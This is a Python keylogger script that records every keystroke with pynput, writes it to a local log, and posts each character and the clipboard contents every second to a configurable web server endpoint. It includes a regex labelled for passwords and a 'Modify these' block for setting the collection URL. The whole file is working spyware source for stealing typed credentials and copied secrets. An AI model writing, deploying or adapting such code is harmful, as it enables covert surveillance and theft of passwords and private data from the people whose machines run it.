from pynput import keyboard
import os
import re
import time
import requests
import pyperclip

                    #--Modify these--#
######################################################## 
url = "http://127.0.0.1:5000" 
file_path = './file.log'
########################################################

last_line_checked = 0
matched_passwords = set()
previous_clipboard_content = None

########################################################
# regex values so that only alphanumeric keys are logged
password_pattern = re.compile(r'[a-zA-Z0-9@$!%*?&]')
########################################################

########################################################
special_keys = [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab]

content=''
########################################################
# flag to indicate when to stop the threads
exit_threads = False

# function which checks for the key pressed
def keyPressed(key):
    global text, shift_pressed, caps_lock_pressed
    text = ''
    letter = ''
    if key in special_keys:
        with open(file_path, 'a') as file:
            response = requests.post(url+'/keyboard', data="\n")
            file.write('\n')
        print("We got a line break!")

    if hasattr(key, "char") and key.char is not None:
        if key.char.isalpha():
            # Check if the left shift key, Caps Lock, or Shift key is active
            if shift_pressed or caps_lock_pressed or key.char.isupper():
                letter = key.char.upper()
            else:
                letter = key.char.lower()

        elif password_pattern.match(key.char):
            letter = key.char
        text += letter
        # writing the text to a log file 
        with open(file_path, 'a') as file:
           # and sending it to the specified web server
            response = requests.post(url+'/keyboard', data=letter.strip("'"))
            file.write(text)

    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True

    elif key == keyboard.Key.caps_lock:
        caps_lock_pressed = not caps_lock_pressed

def keyReleased(key):
    global shift_pressed

    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False


def copyClipboard():
    global previous_clipboard_content
    clipboard = pyperclip.paste()
    # Only send a request if the clipboard content has changed
    response = requests.post(url+'/clipboard', data=clipboard)
        

def test():
    print("test")
################################
#------ MAIN FUNCTION ---------#
if __name__ == "__main__":
    
    shift_pressed = False
    caps_lock_pressed = False
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()
    try:
        while True:
            copyClipboard()
            if exit_threads:
                break
            time.sleep(1)
    finally:
        exit_threads = True
        listener.stop()
        listener.join()
        input()
